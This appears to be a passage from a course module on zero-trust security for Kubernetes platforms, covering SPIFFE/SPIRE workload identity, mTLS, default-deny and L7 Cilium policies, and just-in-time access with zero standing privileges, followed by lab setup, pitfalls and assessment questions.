- Describe how **mTLS** authenticates and encrypts every service-to-service call.
- Write an **identity-based L7 authorization** policy (only `frontend` may `GET` on
 `backend`).
- Design **just-in-time access** and **zero standing privileges** for human operators.

### 1. Concept

#### Never trust, always verify, assume breach

Traditional security is a hard shell around a soft interior: get past the firewall and
you're "inside," where services trust each other because they share a network. That
model dies the moment one pod is compromised — the attacker inherits all that implicit
trust and moves laterally at will (the blast-radius problem from ).

Zero trust deletes the concept of a trusted interior. Three principles:

- **Never trust.** Network location grants nothing. A request from the next pod gets no
 more trust than one from the public internet.
- **Always verify.** Every request is authenticated (*who are you?*) and authorized
 (*are you allowed to do this specific thing?*) — per request, on identity, not IP.
- **Assume breach.** Design as if the attacker is already inside. Minimize what any
 single identity can reach and do, so one compromise stays small.

The shift is from **where you are** to **who you are**. Identity — not a subnet —
becomes the control plane.

#### Workload identity: SPIFFE and SPIRE

Humans have identities. Workloads need them too — and "the IP it came
from" is not an identity (IPs are reused, spoofable, and reassigned constantly). You
need a **cryptographic, verifiable** identity per workload.

- **SPIFFE** (Secure Production Identity Framework For Everyone) is the open *standard*.
 It defines a **SPIFFE ID** — a URI like `spiffe://cluster.local/ns/payments/sa/api` —
 and the **SVID**, an identity document (usually an X.509 certificate) that encodes it.
- **SPIRE** is the reference *implementation*: a server + per-node agents that
 **attest** workloads (prove a pod really is what it claims, using kubelet/node facts)
 and issue short-lived SVIDs automatically. No secrets to distribute; identities rotate
 on their own.

```text
 Pod starts ──▶ SPIRE agent attests it (node + k8s facts: "this really is payments/api")
 │
 ▼
 issues a short-lived SVID (X.509 cert carrying spiffe://.../payments/api)
 │
 ▼
 Pod presents its SVID on every call ──▶ peer verifies identity cryptographically
```

The payoff: a workload identity you can *verify*, scope policy to, and rotate — the
foundation everything else in zero trust builds on.

#### mTLS: authenticate and encrypt every hop

Ordinary TLS authenticates the *server* (your browser checks the website). **Mutual
TLS** authenticates *both* ends: client and server each present a certificate and
verify the other. Wire SVIDs into mTLS and every service-to-service call becomes:

- **authenticated** — both sides cryptographically prove their SPIFFE identity, and
- **encrypted** — traffic is confidential and tamper-evident on the wire.

Now "is this caller allowed?" is answered by *verified identity*, not by a source IP a
compromised neighbour could borrow. A service mesh (Istio, Linkerd) can provide this via
sidecars; **Cilium** can provide mTLS and identity-aware policy at the eBPF/network
layer without a sidecar per pod — the same Cilium Project 1 chose in
ADR-002.

#### Identity-based authorization: L3/L4 vs L7

Authentication establishes identity; **authorization** decides what that identity may
do. Kubernetes `NetworkPolicy` works at **L3/L4** — it allows or denies by pod selector
and port ("`frontend` pods may reach `backend` on 8080"). Useful, but coarse: once
allowed on the port, the caller can hit *any* path or method.

**L7 authorization** goes further — it understands the application protocol (HTTP, gRPC,
Kafka) and can allow *specific methods and paths*: "`frontend` may `GET /api/*` on
`backend`, and nothing else." That's the zero-trust ideal of **least privilege applied
to traffic**, and it's what `CiliumNetworkPolicy` expresses:

```text
 L3/L4 (NetworkPolicy): frontend ─▶ backend:8080 (all paths/methods)
 L7 (CiliumNetworkPolicy): frontend ─▶ backend GET /api/* (this verb, this path)
 everything else ─▶ DENIED
```

Start every namespace at **default-deny** and allow only the specific identity-to-
identity calls each service actually needs. Deny-by-default east-west traffic is the
single highest-value zero-trust move.

#### JIT access and zero standing privileges

Zero trust applies to humans too. **Standing privilege** — a person who holds
`cluster-admin` permanently — is a permanent, high-value target: one phished laptop and
the attacker has the cluster (recall the debugging exercise in ).

- **Zero standing privileges (ZSP).** *No human* holds powerful permissions by default.
 The baseline for everyone is least privilege.
- **Just-in-time (JIT) access.** When an operator genuinely needs elevation, they
 **request** it; after approval they get a **time-boxed, audited** grant that expires
 automatically (minutes to hours), ideally with a reason and a ticket. Break-glass
 paths exist but are loud and logged.

The result: powerful privilege exists only transiently, for a named person, for a
stated reason, with an audit trail — not as a permanent liability sitting in a binding.

### 2. Why it matters for platform engineering

- **It caps lateral movement — the thing that turns an incident into a catastrophe.**
 Default-deny + identity-based authz means a compromised pod can reach only the few
 identities it was explicitly allowed to, not the whole cluster.
- **Identity-based policy is stable; IP-based policy rots.** Pods churn and IPs recycle
 constantly. Policies written against *identities* survive rescheduling and scaling;
 policies written against IPs are wrong by lunchtime.
- **The platform provides it so teams get it for free.** Workload identity, mTLS, and
 default-deny templates are platform capabilities. Teams inherit authenticated,
 encrypted, least-privilege networking without writing any of it — security as a
 structural default, the course's through-line.
- **ZSP shrinks the human attack surface to near zero.** Most serious breaches ride a
 stolen human credential. If that credential is normally powerless and elevation is
 transient and audited, the stolen-credential play largely stops working.
- **It is the organizing frame for the whole phase.** RBAC (13.2), policy (13.3),
 secrets (13.4), signing (13.6), and runtime (13.7) are all instances of "verify
 explicitly, least privilege, assume breach." Zero trust is the name for the pattern.

### 3. Mental model

**Nightclub, not neighbourhood.** Perimeter security is a gated neighbourhood: clear the
gate once and every house trusts you. Zero trust is a nightclub where the bouncer checks
ID at *every* door — the entrance, the bar, the VIP room — and your wristband only opens
the specific doors you're entitled to, for as long as it's valid.

```text
 Perimeter trust Zero trust
 ─────────────── ──────────
 ┌─────────────────────────┐ every hop re-verifies IDENTITY + checks AUTHZ:
 │ gate │ inside, all pods │
 │ │ trust each other │ frontend ──(mTLS: prove spiffe://…/frontend)──▶ backend
 │ │ (flat, implicit) │ backend: "is frontend allowed GET /api/*? yes" ✓
 └─────────────────────────┘ anyone else / other path ─────────────────▶ ✗
 one breach ⇒ whole interior one breach ⇒ only its explicitly-allowed calls
```

Two things to remember: **identity is the perimeter now**, and **default-deny is the
starting point** — you add specific allowed identity-to-identity calls, never "allow
all then block some."

### 4. Minimal implementation

You don't need SPIRE and a mesh to start practising zero trust. The smallest move is
**default-deny east-west traffic**, then allow only what's needed. On a plain cluster,
every pod can talk to every other pod:

```bash
# Before: anything can reach anything (implicit trust).
kubectl exec frontend -- curl -s backend:8080/admin # works — no one checked
```

Apply a default-deny policy for the namespace, and that implicit trust vanishes:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
 name: default-deny
spec:
 podSelector: {} # every pod in the namespace
 policyTypes: [Ingress, Egress]
 # no ingress/egress rules = deny all; add back only what each service needs
```

Now nothing talks to anything until you *explicitly* allow it — the zero-trust default.
That's L3/L4. The lab goes one level further with Cilium, authorizing a *specific HTTP
method and path* by *identity*: `frontend` may `GET /api/*` on `backend`, and every
other call — including `frontend` hitting `/admin` — is denied at L7.

### 5. Hands-on lab

You'll stand up a Cilium-enabled kind cluster, deploy a `frontend` and `backend`, and
write a `CiliumNetworkPolicy` that authorizes **only** `frontend → backend GET /api/*`
— proving at L7 that an allowed caller on a forbidden path is still denied.

➡️ **Start the lab**

### 6. Production considerations

- **Roll out default-deny carefully.** Flipping a namespace to deny-all without mapping
 real dependencies causes outages. Observe flows first (Hubble, flow logs), write the
 allow-rules, *then* deny — the same audit-before-enforce discipline as.
- **Identity infrastructure is now critical.** SPIRE/mesh control planes issuing SVIDs
 must be HA; if identity issuance stalls, mTLS handshakes fail. Monitor certificate
 rotation and clock skew.
- **mTLS has cost.** Handshakes and encryption add latency and CPU. eBPF-based (Cilium)
 or sidecar (Istio/Linkerd) approaches trade off overhead, operability, and features —
 choose deliberately, and measure.
- **L7 policy needs a capable data plane.** L7 rules require Cilium (or a mesh); plain
 `NetworkPolicy` is L3/L4 only. Know what your CNI supports before you promise L7.
- **JIT needs tooling and culture.** Time-boxed elevation requires an access-request
 system, approvals, and audit; break-glass must be rare, loud, and reviewed. Without
 the workflow, ZSP becomes "everyone keeps a backdoor admin."
- **Zero trust is a journey, not a switch.** Sequence it: default-deny L3/L4 → workload
 identity + mTLS → L7 authz → ZSP/JIT. Each step is valuable on its own.

### 7. Common mistakes

- **Trusting the network ("it's internal, so it's safe").** Flat, implicit intra-cluster
 trust lets one compromised pod roam freely. *Fix:* default-deny east-west and require
 identity on every call.
- **Authorizing by IP/CIDR.** Pod IPs churn; IP-based allowlists are instantly stale and
 a false sense of safety. *Fix:* write policy against workload *identity* (labels/
 SPIFFE), not addresses.
- **Enabling default-deny blind.** Turning on deny-all without first mapping real traffic
 takes down half the namespace. *Fix:* observe flows, write allows, then deny.
- **Stopping at L3/L4.** Allowing `frontend → backend:8080` and assuming you're done —
 the caller can still hit `/admin`. *Fix:* add L7 authz for the specific methods/paths.
- **Permanent cluster-admins "for convenience."** Standing privilege is a standing
 breach waiting to happen. *Fix:* zero standing privileges + JIT, time-boxed and
 audited.
- **Treating zero trust as a product you buy.** Installing a mesh and declaring victory
 while RBAC is wide open and secrets sit in Git. *Fix:* it's a principle applied across
 every layer of this phase, not a single tool.

### 8. Assessment

**Knowledge checks**

1. State the three zero-trust principles and what each changes about a default.
2. Why is a pod's IP address not a usable identity, and what does SPIFFE provide instead?
3. What does mTLS add over ordinary (server-only) TLS?
4. Give one thing an L7 policy can express that an L3/L4 `NetworkPolicy` cannot.

**Concept exercise**

> Explain how a platform stops a compromised pod from reaching every other service
> **without using the words "zero trust," "mTLS," or "Cilium."** Describe the default
> and the check, not the products.

**Trade-off / debugging exercise**

> A team enables default-deny on their namespace on Friday afternoon. Monitoring breaks,
> then the payments service starts erroring. Explain what almost certainly happened, the
> correct sequence they should have followed, and how workload *identity* (not IP rules)
> would make the eventual allow-list more durable. Then describe how you'd grant an
> on-call engineer temporary debug access without giving anyone standing cluster-admin.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Principles:** never trust (location grants nothing), always verify (authn+authz per
 request on identity), assume breach (minimize reach/privilege so one compromise stays
 small).
- **IP vs SPIFFE:** pod IPs are reused, reassigned, and spoofable, so they identify
 nothing durably. SPIFFE gives a verifiable, cryptographic workload identity (a SPIFFE
 ID in an SVID cert) that policy can target and that rotates automatically.
- **mTLS:** both client and server present and verify certificates, so each call is
 mutually authenticated *and* encrypted — vs server-only TLS where the client is
 unauthenticated.
- **L7 vs L3/L4:** L7 can allow a specific method/path (e.g. `GET /api/*`) or gRPC/Kafka
 verb; L3/L4 can only allow a pod-to-pod connection on a port.
- **Debugging:** default-deny with no egress/ingress allow-rules blocked the monitoring
 scrape and the payments dependency. Correct order: observe real flows (Hubble/flow
 logs) → write identity-based allow policies (including to monitoring) → then enforce
 deny. Identity-based rules survive pod churn that would break IP-based ones. For the
 on-call: a JIT, time-boxed, audited RoleBinding granting only the needed debug verbs,
 auto-expiring — never a permanent cluster-admin.

</details>

### 9. Further reading

- [SPIFFE](https://spiffe.io/) and [SPIRE](https://spiffe.io/docs/latest/spire-about/spire-concepts/)
- Cilium — [Network Policy (L3/L4/L7)](https://docs.cilium.io/en/stable/security/policy/) and [mutual authentication](https://docs.cilium.io/en/stable/network/servicemesh/mutual-authentication/mutual-authentication/)
- NIST — [SP 800-207: Zero Trust Architecture](https://csrc.nist.gov/pubs/sp/800/207/final)
- Kubernetes — [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- Google — [BeyondProd: cloud-native security model](https://cloud.google.com/docs/security/beyondprod)
- CNCF — [Zero Trust and workload identity (TAG Security)](https://tag-security.cncf.io/)

---


_Previous:_ Runtime Security
· _Next:_ Kubernetes Networking →
